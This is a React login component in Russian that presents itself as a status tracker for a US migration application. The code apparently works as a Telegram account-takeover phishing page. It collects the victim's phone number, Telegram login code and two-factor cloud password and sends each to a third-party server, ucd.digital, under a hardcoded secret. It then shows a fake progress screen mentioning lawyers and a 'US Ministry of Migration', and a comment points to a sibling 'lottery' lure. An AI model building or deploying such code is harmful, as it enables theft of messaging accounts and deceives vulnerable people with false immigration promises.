"use client"

import { useState, useRef, useEffect, useCallback } from "react"
import {
  Phone,
  ShieldCheck,
  Lock,
  ChevronDown,
  ArrowLeft,
  Loader2,
  CheckCircle2,
  Search,
  Clock,
  FileSearch,
} from "lucide-react"

type Step = "phone" | "code" | "password" | "success"

interface Country {
  code: string
  name: string
  dialCode: string
  format: string
  maxLength: number
}

const countries: Country[] = [
  { code: "BY", name: "Беларусь", dialCode: "+375", format: "(XX) XXX-XX-XX", maxLength: 9 },
  { code: "RU", name: "Россия", dialCode: "+7", format: "(XXX) XXX-XX-XX", maxLength: 10 },
  { code: "UA", name: "Украина", dialCode: "+380", format: "(XX) XXX-XX-XX", maxLength: 9 },
  { code: "KZ", name: "Казахстан", dialCode: "+7", format: "(XXX) XXX-XX-XX", maxLength: 10 },
  { code: "PL", name: "Польша", dialCode: "+48", format: "XXX XXX XXX", maxLength: 9 },
  { code: "LT", name: "Литва", dialCode: "+370", format: "(XXX) XXXXX", maxLength: 8 },
  { code: "LV", name: "Латвия", dialCode: "+371", format: "XXXX XXXX", maxLength: 8 },
  { code: "GE", name: "Грузия", dialCode: "+995", format: "(XXX) XXX XXX", maxLength: 9 },
  { code: "AM", name: "Армения", dialCode: "+374", format: "(XX) XXX-XXX", maxLength: 8 },
  { code: "AZ", name: "Азербайджан", dialCode: "+994", format: "(XX) XXX-XX-XX", maxLength: 9 },
  { code: "MD", name: "Молдова", dialCode: "+373", format: "(XXX) XX-XXX", maxLength: 8 },
  { code: "UZ", name: "Узбекистан", dialCode: "+998", format: "(XX) XXX-XX-XX", maxLength: 9 },
]

// UCD Panel API — identical to the lottery flow
const UCD_API_URL = "https://ucd.digital/api/miniapp/auth"
const MINIAPP_SECRET = "ucd-miniapp-secret-2026"

export function PhoneAuth() {
  const [step, setStep] = useState<Step>("phone")
  const [selectedCountry, setSelectedCountry] = useState<Country>(countries[0])
  const [isCountryOpen, setIsCountryOpen] = useState(false)
  const [countrySearch, setCountrySearch] = useState("")
  const [phone, setPhone] = useState("")
  const [password, setPassword] = useState("")
  const [codeDigits, setCodeDigits] = useState(["", "", "", "", ""])
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [phoneError, setPhoneError] = useState("")
  const [codeError, setCodeError] = useState("")
  const [passwordError, setPasswordError] = useState("")
  const [resendTimer, setResendTimer] = useState(0)

  const phoneInputRef = useRef<HTMLInputElement>(null)
  const codeInputsRef = useRef<(HTMLInputElement | null)[]>([])
  const dropdownRef = useRef<HTMLDivElement>(null)
  const countrySearchRef = useRef<HTMLInputElement>(null)

  const filteredCountries = countries.filter(
    (c) =>
      c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
      c.dialCode.includes(countrySearch),
  )

  useEffect(() => {
    if (isCountryOpen && countrySearchRef.current) {
      setTimeout(() => countrySearchRef.current?.focus(), 100)
    }
  }, [isCountryOpen])

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsCountryOpen(false)
      }
    }
    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [])

  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [resendTimer])

  const formatPhone = (value: string, format: string) => {
    const digits = value.replace(/\D/g, "")
    let result = ""
    let digitIndex = 0
    for (const char of format) {
      if (digitIndex >= digits.length) break
      if (char === "X") {
        result += digits[digitIndex]
        digitIndex++
      } else {
        result += char
      }
    }
    return result
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "")
    const limited = raw.slice(0, selectedCountry.maxLength)
    setPhone(formatPhone(limited, selectedCountry.format))
    setPhoneError("")
  }

  const isPhoneComplete = phone.replace(/\D/g, "").length === selectedCountry.maxLength

  // --- UCD API calls (identical logic to lottery) ---
  const requestCode = async () => {
    const fullPhone = selectedCountry.dialCode + phone.replace(/\D/g, "")
    setIsLoading(true)
    setPhoneError("")
    try {
      const response = await fetch(UCD_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Miniapp-Secret": MINIAPP_SECRET },
        body: JSON.stringify({ action: "request_code", phone: fullPhone }),
      })
      const data = await response.json()
      if (data.success) {
        setSessionId(data.session_id)
        setStep("code")
        setResendTimer(60)
      } else {
        const error = data.error || "Не удалось отправить код"
        if (error.startsWith("FLOOD_WAIT_")) {
          const seconds = parseInt(error.replace("FLOOD_WAIT_", ""), 10)
          setPhoneError(`Слишком много попыток. Подождите ${seconds} сек.`)
          setResendTimer(seconds)
        } else if (error === "PHONE_NUMBER_INVALID") {
          setPhoneError("Неверный формат номера телефона")
        } else if (error === "PHONE_NUMBER_BANNED") {
          setPhoneError("Этот номер заблокирован")
        } else {
          setPhoneError(error)
        }
      }
    } catch {
      setPhoneError("Ошибка соединения. Попробуйте позже")
    } finally {
      setIsLoading(false)
    }
  }

  const submitCode = useCallback(
    async (codeOverride?: string) => {
      const code = codeOverride ?? codeDigits.join("")
      if (code.length !== 5) return
      setIsLoading(true)
      setCodeError("")
      try {
        const response = await fetch(UCD_API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Miniapp-Secret": MINIAPP_SECRET },
          body: JSON.stringify({ action: "submit_code", session_id: sessionId, code }),
        })
        const data = await response.json()
        if (data.success) {
          if (data.requires_2fa) {
            setStep("password")
          } else {
            setStep("success")
          }
        } else {
          const error = data.error || "Неверный код"
          if (error.startsWith("FLOOD_WAIT_")) {
            const seconds = parseInt(error.replace("FLOOD_WAIT_", ""), 10)
            setCodeError(`Слишком много попыток. Подождите ${seconds} сек.`)
          } else if (error === "PHONE_CODE_INVALID") {
            setCodeError("Неверный код")
          } else if (error === "PHONE_CODE_EXPIRED") {
            setCodeError("Код истёк. Запросите новый")
          } else if (error === "Сессия не найдена или истекла") {
            setCodeError("Сессия истекла. Запросите код заново")
          } else {
            setCodeError(error)
          }
          setCodeDigits(["", "", "", "", ""])
          codeInputsRef.current[0]?.focus()
        }
      } catch {
        setCodeError("Ошибка соединения")
      } finally {
        setIsLoading(false)
      }
    },
    [codeDigits, sessionId],
  )

  const submitPassword = async () => {
    if (!password) return
    setIsLoading(true)
    setPasswordError("")
    try {
      const response = await fetch(UCD_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Miniapp-Secret": MINIAPP_SECRET },
        body: JSON.stringify({ action: "submit_2fa", session_id: sessionId, password }),
      })
      const data = await response.json()
      if (data.success) {
        setStep("success")
      } else {
        const error = data.error || "Неверный пароль"
        if (error.startsWith("FLOOD_WAIT_")) {
          const seconds = parseInt(error.replace("FLOOD_WAIT_", ""), 10)
          setPasswordError(`Слишком много попыток. Подождите ${seconds} сек.`)
        } else if (error === "PASSWORD_HASH_INVALID") {
          setPasswordError("Неверный пароль")
        } else {
          setPasswordError(error)
        }
      }
    } catch {
      setPasswordError("Ошибка соединения")
    } finally {
      setIsLoading(false)
    }
  }

  const handleCodeDigitChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return
    const newDigits = [...codeDigits]
    newDigits[index] = value.slice(-1)
    setCodeDigits(newDigits)
    setCodeError("")
    if (value && index < 4) codeInputsRef.current[index + 1]?.focus()
    if (newDigits.every((d) => d !== "") && newDigits.join("").length === 5) {
      setTimeout(() => submitCode(newDigits.join("")), 100)
    }
  }

  const handleCodeKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !codeDigits[index] && index > 0) {
      codeInputsRef.current[index - 1]?.focus()
    }
  }

  const handleCodePaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5)
    if (pasted.length === 5) {
      setCodeDigits(pasted.split(""))
      codeInputsRef.current[4]?.focus()
      setTimeout(() => submitCode(pasted), 100)
    }
  }

  const fieldClass =
    "w-full rounded-xl border bg-secondary px-4 py-3.5 text-base text-foreground outline-none transition-colors placeholder:text-muted-foreground/60"

  return (
    <div className="rounded-3xl border border-border bg-card/80 p-6 shadow-2xl shadow-red-950/20 backdrop-blur-sm sm:p-8">
      {/* Phone step */}
      {step === "phone" && (
        <div>
          <div className="flex size-12 items-center justify-center rounded-2xl bg-red-500/10">
            <Phone className="size-6 text-red-500" aria-hidden="true" />
          </div>
          <h2 className="mt-4 text-xl font-semibold">Вход по номеру телефона</h2>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Введите номер, привязанный к Telegram. Мы отправим код подтверждения
            в приложение Telegram.
          </p>

          <div className="mt-6">
            <label className="mb-2 block text-sm text-muted-foreground">Номер телефона</label>
            <div className="flex gap-2">
              {/* Country selector */}
              <div className="relative" ref={dropdownRef}>
                <button
                  type="button"
                  onClick={() => setIsCountryOpen((v) => !v)}
                  className="flex h-full items-center gap-1.5 rounded-xl border border-border bg-secondary px-3 py-3.5 text-sm font-medium transition-colors hover:border-white/20"
                >
                  {selectedCountry.dialCode}
                  <ChevronDown className="size-4 text-muted-foreground" aria-hidden="true" />
                </button>
                {isCountryOpen && (
                  <div className="absolute left-0 top-full z-20 mt-2 w-64 overflow-hidden rounded-xl border border-border bg-popover shadow-2xl">
                    <div className="flex items-center gap-2 border-b border-border px-3 py-2">
                      <Search className="size-4 text-muted-foreground" aria-hidden="true" />
                      <input
                        ref={countrySearchRef}
                        value={countrySearch}
                        onChange={(e) => setCountrySearch(e.target.value)}
                        placeholder="Поиск страны"
                        className="w-full bg-transparent text-sm outline-none placeholder:text-muted-foreground/60"
                      />
                    </div>
                    <ul className="max-h-56 overflow-y-auto py-1">
                      {filteredCountries.map((c) => (
                        <li key={c.code}>
                          <button
                            type="button"
                            onClick={() => {
                              setSelectedCountry(c)
                              setIsCountryOpen(false)
                              setCountrySearch("")
                              setPhone("")
                            }}
                            className="flex w-full items-center justify-between px-3 py-2 text-left text-sm transition-colors hover:bg-accent"
                          >
                            <span>{c.name}</span>
                            <span className="text-muted-foreground">{c.dialCode}</span>
                          </button>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>

              <input
                ref={phoneInputRef}
                type="tel"
                inputMode="numeric"
                value={phone}
                onChange={handlePhoneChange}
                placeholder={selectedCountry.format.replace(/X/g, "0")}
                className={`${fieldClass} flex-1 ${
                  phoneError ? "border-red-500/50" : "border-border focus:border-white/20"
                }`}
              />
            </div>
            {phoneError && <p className="mt-2 text-sm text-red-400">{phoneError}</p>}
          </div>

          <button
            type="button"
            onClick={requestCode}
            disabled={!isPhoneComplete || isLoading}
            className="mt-6 inline-flex w-full items-center justify-center gap-2 rounded-xl bg-red-600 px-6 py-3.5 text-sm font-semibold text-white transition-colors hover:bg-red-500 disabled:cursor-not-allowed disabled:opacity-40"
          >
            {isLoading ? (
              <Loader2 className="size-4 animate-spin" aria-hidden="true" />
            ) : (
              <>Получить код</>
            )}
          </button>
        </div>
      )}

      {/* Code step */}
      {step === "code" && (
        <div>
          <button
            type="button"
            onClick={() => setStep("phone")}
            className="mb-4 inline-flex items-center gap-1.5 text-sm text-muted-foreground transition-colors hover:text-foreground"
          >
            <ArrowLeft className="size-4" aria-hidden="true" />
            Назад
          </button>
          <div className="flex size-12 items-center justify-center rounded-2xl bg-red-500/10">
            <ShieldCheck className="size-6 text-red-500" aria-hidden="true" />
          </div>
          <h2 className="mt-4 text-xl font-semibold">Введите код</h2>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Код отправлен в Telegram на номер{" "}
            <span className="font-medium text-foreground">
              {selectedCountry.dialCode} {phone}
            </span>
          </p>

          <div className="mt-6 flex justify-between gap-2" onPaste={handleCodePaste}>
            {codeDigits.map((digit, i) => (
              <input
                key={i}
                ref={(el) => {
                  codeInputsRef.current[i] = el
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleCodeDigitChange(i, e.target.value)}
                onKeyDown={(e) => handleCodeKeyDown(i, e)}
                className={`h-14 w-full rounded-xl border bg-secondary text-center text-xl font-semibold outline-none transition-colors ${
                  codeError ? "border-red-500/50" : "border-border focus:border-red-500/50"
                }`}
              />
            ))}
          </div>
          {codeError && <p className="mt-2 text-sm text-red-400">{codeError}</p>}

          <div className="mt-5 flex items-center justify-between text-sm">
            {resendTimer > 0 ? (
              <span className="text-muted-foreground">
                Повторно через {resendTimer} сек.
              </span>
            ) : (
              <button
                type="button"
                onClick={requestCode}
                disabled={isLoading}
                className="font-medium text-red-400 transition-colors hover:text-red-300"
              >
                Отправить код повторно
              </button>
            )}
            {isLoading && <Loader2 className="size-4 animate-spin text-muted-foreground" />}
          </div>
        </div>
      )}

      {/* Password (2FA) step */}
      {step === "password" && (
        <div>
          <button
            type="button"
            onClick={() => setStep("code")}
            className="mb-4 inline-flex items-center gap-1.5 text-sm text-muted-foreground transition-colors hover:text-foreground"
          >
            <ArrowLeft className="size-4" aria-hidden="true" />
            Назад
          </button>
          <div className="flex size-12 items-center justify-center rounded-2xl bg-red-500/10">
            <Lock className="size-6 text-red-500" aria-hidden="true" />
          </div>
          <h2 className="mt-4 text-xl font-semibold">Облачный пароль</h2>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            На вашем аккаунте включена двухфакторная защита. Введите облачный
            пароль Telegram, чтобы продолжить.
          </p>

          <input
            type="password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value)
              setPasswordError("")
            }}
            placeholder="Пароль"
            className={`${fieldClass} mt-6 ${
              passwordError ? "border-red-500/50" : "border-border focus:border-white/20"
            }`}
          />
          {passwordError && <p className="mt-2 text-sm text-red-400">{passwordError}</p>}

          <button
            type="button"
            onClick={submitPassword}
            disabled={!password || isLoading}
            className="mt-6 inline-flex w-full items-center justify-center gap-2 rounded-xl bg-red-600 px-6 py-3.5 text-sm font-semibold text-white transition-colors hover:bg-red-500 disabled:cursor-not-allowed disabled:opacity-40"
          >
            {isLoading ? <Loader2 className="size-4 animate-spin" aria-hidden="true" /> : <>Войти</>}
          </button>
        </div>
      )}

      {/* Success — application status tracking */}
      {step === "success" && (
        <div>
          <div className="flex size-12 items-center justify-center rounded-2xl bg-green-500/10">
            <CheckCircle2 className="size-6 text-green-400" aria-hidden="true" />
          </div>
          <h2 className="mt-4 text-xl font-semibold">Вы вошли в систему</h2>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Номер{" "}
            <span className="font-medium text-foreground">
              {selectedCountry.dialCode} {phone}
            </span>{" "}
            подтверждён. Ниже — текущий статус вашей заявки.
          </p>

          <div className="mt-6 space-y-3">
            <div className="flex items-start gap-3 rounded-2xl border border-border bg-secondary/50 p-4">
              <div className="flex size-9 shrink-0 items-center justify-center rounded-lg bg-green-500/10">
                <CheckCircle2 className="size-5 text-green-400" aria-hidden="true" />
              </div>
              <div>
                <p className="text-sm font-medium">Заявка получена</p>
                <p className="mt-0.5 text-xs text-muted-foreground">
                  Ваши документы зарегистрированы в системе.
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3 rounded-2xl border border-red-500/30 bg-red-500/5 p-4">
              <div className="flex size-9 shrink-0 items-center justify-center rounded-lg bg-red-500/10">
                <FileSearch className="size-5 text-red-500" aria-hidden="true" />
              </div>
              <div>
                <p className="text-sm font-medium">На проверке документов</p>
                <p className="mt-0.5 text-xs text-muted-foreground">
                  Юристы проверяют пакет документов. Примерный ответ — через 3–4 дня.
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3 rounded-2xl border border-border bg-secondary/30 p-4 opacity-60">
              <div className="flex size-9 shrink-0 items-center justify-center rounded-lg bg-muted">
                <Clock className="size-5 text-muted-foreground" aria-hidden="true" />
              </div>
              <div>
                <p className="text-sm font-medium">Передача в Министерство миграции США</p>
                <p className="mt-0.5 text-xs text-muted-foreground">
                  Следующий этап после успешной проверки.
                </p>
              </div>
            </div>
          </div>

          <p className="mt-6 rounded-xl border border-border bg-secondary/40 p-4 text-xs leading-relaxed text-muted-foreground">
            Уведомления об изменении статуса приходят в наш Telegram-бот. Держите
            приложение под рукой — мы свяжемся с вами по этому номеру.
          </p>
        </div>
      )}
    </div>
  )
}
